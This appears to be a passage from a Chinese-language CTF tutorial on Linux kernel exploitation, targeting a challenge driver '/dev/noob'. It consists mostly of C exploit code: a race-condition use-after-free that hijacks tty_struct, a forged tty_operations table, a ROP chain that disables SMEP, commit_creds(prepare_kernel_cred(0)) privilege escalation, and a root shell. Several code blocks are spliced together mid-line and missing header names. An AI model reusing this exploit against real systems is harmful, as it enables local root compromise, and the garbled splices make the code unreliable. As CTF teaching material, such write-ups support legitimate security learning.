    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    struct IO_noob {
        uint64_t index;
        void *buf;
        uint64_t size;
    };
    struct IO_noob io;
    void fake_size() {
        while(1) {
            io.size = 0xA8; 
        }
    }
    int main()
    {
        char IO_value[0x1000] = {0};
        int fd1 = open("/dev/noob", O_RDONLY);
        pthread_t t;
        pthread_create(&t, NULL, (void*)fake_size, NULL);
        io.index = 0;
        io.buf   = IO_value;
        while (1)
        {
            io.size  = 0x10;
            if(ioctl(fd1, 0x30000, &io) == 0)
                break;
        }
        pthread_cancel(t);
        puts("[+] Now we have a 0xA0 size Chunk!");
        ioctl(fd1, 0x30001, &io); // For BreakPoint
        return 0;
    }
⚠️ **：注意，因为我们使用了`pthread`实现多线程，因此在使用`gcc`编译时需要添加`-pthread`参数！**
分配成功
##### 劫持`tty struct`结构体
接下来我们尝试去利用这个UAF漏洞来劫持`tty
struct`，那么我们首先就要计算这个结构体的大小，此处为了避免源码分析出错，我们选择写一个Demo用于测试。
    #include 
    #include 
    #include 
    #include 
    #include 
    MODULE_LICENSE("Dual BSD/GPL");
    static int hello_init(void)
    {
        printk(KERN_ALERT "sizeof cred   : %d", sizeof(struct cred));
        printk(KERN_ALERT "sizeof tty    : %d", sizeof(struct tty_struct));
        printk(KERN_ALERT "sizeof tty_op : %d", sizeof(struct tty_operations));
        return 0;
    }
    static void hello_exit(void)
    {
        printk(KERN_ALERT "exit module!");
    }
    module_init(hello_init);
    module_exit(hello_exit);
使用以下makefile进行编译:
    obj-m := important_size.o
    KERNELBUILD := SourceCode/linux-4.15.15
    CURDIR := /home/error404/Desktop/Mac_desktop/Linux-Kernel
    modules:
        make -C $(KERNELBUILD) M=$(CURDIR) modules
    clean:
        make -C $(KERNELBUILD) M=$(CURDIR) clean
使用IDA反编译即可
!
那么我们构造如下PoC就可以把`tty struct`结构体分配到我们的目标区域。
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    struct IO_noob {
        uint64_t index;
        void *buf;
        uint64_t size;
    };
    struct IO_noob io;
    void fake_size() {
        while(1) {
            io.size = 0x2C0; 
        }
    }
    int main()
    {
        char IO_value[0x30] = {0};
        int fd1 = open("/dev/noob", O_RDONLY);
        pthread_t t;
        pthread_create(&t, NULL, (void*)fake_size, NULL);
        io.index = 0;
        io.buf   = IO_value;
        while (1)
        {
            io.size  = 0x10;
            if(ioctl(fd1, 0x30000, &io) == 0)
                break;
        }
        pthread_cancel(t);
        puts("[+] Now we have a 0x2C0 size Chunk!");
        ioctl(fd1, 0x30001, &io);
        int fd2 = open("/dev/ptmx", O_RDWR|O_NOCTTY);
        if (fd_tty 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    struct IO_noob {
        uint64_t index;
        void *buf;
        uint64_t size;
    };
    struct IO_noob io;
    void fake_size() {
        while(1) {
            io.size = 0x2C0; 
        }
    }
    int main()
    {
        size_t IO_value[5] = {0};
        size_t Fake_tty_operations[0x118/8] = {0};
        Fake_tty_operations[12] = 0xDEADBEEF;
        int fd1 = open("/dev/noob", O_RDONLY);
        pthread_t t;
        pthread_create(&t, NULL, (void*)fake_size, NULL);
        io.index = 0;
        io.buf   = IO_value;
        while (1)
        {
            io.size  = 0x10;
            if(ioctl(fd1, 0x30000, &io) == 0)
                break;
        }
        pthread_cancel(t);
        puts("[+] Now we have a 0x2C0 size Chunk!");
        ioctl(fd1, 0x30001, &io);
        int fd2 = open("/dev/ptmx", O_RDWR);
        if (fd2 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    struct trap_frame{
        void *rip;
        uint64_t cs;
        uint64_t rflags;
        void * rsp;
        uint64_t ss;
    }__attribute__((packed));
    struct trap_frame tf;
    void launch_shell(){
        puts("[+] Now Root!");
        execl("/bin/sh","sh",NULL);
    }
    void save_status(){
        asm(
            "mov %%cs,  %0n"
            "mov %%ss,  %1n"
            "mov %%rsp, %3n"
            "pushfqn"
            "popq %2" :"=r"(tf.cs),"=r"(tf.ss),"=r"(tf.rflags),"=r"(tf.rsp) :
            :"memory"
        );
        tf.rsp -= 4096;
        tf.rip = &launch_shell;
    }
    uint64_t (*commit_creds)(uint64_t cred) = (void *)0xffffffff810ad430;
    uint64_t (*prepare_kernel_cred)(uint64_t cred) = (void *)0xffffffff810ad7e0;
    void payload(void){
        commit_creds(prepare_kernel_cred(0));
        asm("movq $tf, %rspn"
            "swapgsn"
            "iretqn");
    }
    struct IO_noob {
        uint64_t index;
        void *buf;
        uint64_t size;
    };
    struct IO_noob io;
    void fake_size() {
        while(1) {
            io.size = 0x2C0; 
        }
    }
    int main()
    {
        size_t IO_value[5] = {0};
        size_t Fake_tty_operations[0x118/8] = {0};
        Fake_tty_operations[12] = 0xffffffff8101db17;
        size_t *ROP_chain = mmap((void *)(0x8101d000), 0x1000, 7, 0x22, -1, 0); 
        if (!ROP_chain) {
            puts("mmap error");
            exit(-1); 
        }
        size_t pop_rdi_ret = 0xffffffff8107f460;
        size_t mov_cr4_rdi = 0xffffffff8101f2f0;
        size_t rop_chain[] = {
            pop_rdi_ret,
            0x6e0,
            mov_cr4_rdi,
            0,
            payload,
            0xDEADBEEF,
        };
        memcpy((void *)(0x8101db17), rop_chain, sizeof(rop_chain));
        int fd1 = open("/dev/noob", O_RDONLY);
        save_status();
        pthread_t t;
        pthread_create(&t, NULL, (void*)fake_size, NULL);
        io.index = 0;
        io.buf   = IO_value;
        while (1)
        {
            io.size  = 0x10;
            if(ioctl(fd1, 0x30000, &io) == 0)
                break;
        }
        pthread_cancel(t);
        puts("[+] Now we have a 0x2C0 size Chunk!");
        ioctl(fd1, 0x30001, &io);
        int fd2 = open("/dev/ptmx", O_RDWR);
        if (fd2 < 0) {
            puts("[-] open error");
            exit(-1); 
        }
        puts("[+] Now we can write tty struct Chunk!");
        io.size  = 0x30;
        ioctl(fd1, 0x30003, &io);
        IO_value[3] = (size_t)Fake_tty_operations;
        ioctl(fd1, 0x30002, &io);
        puts("[+] Now ROP!");
        ioctl(fd2, 0, 0);
        return 0;
    }
## 0x08 参考链接
[CTF-Wiki Linux Kernel](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel)
[When kallsyms doesn’t show addresses even though kptr_restrict is 0 – hatena
](https://kernhack.hatenablog.com/entry/2018/10/16/231945)
[kernel pwn入门(1) 简易环境搭建](http://pzhxbz.cn/?p=98)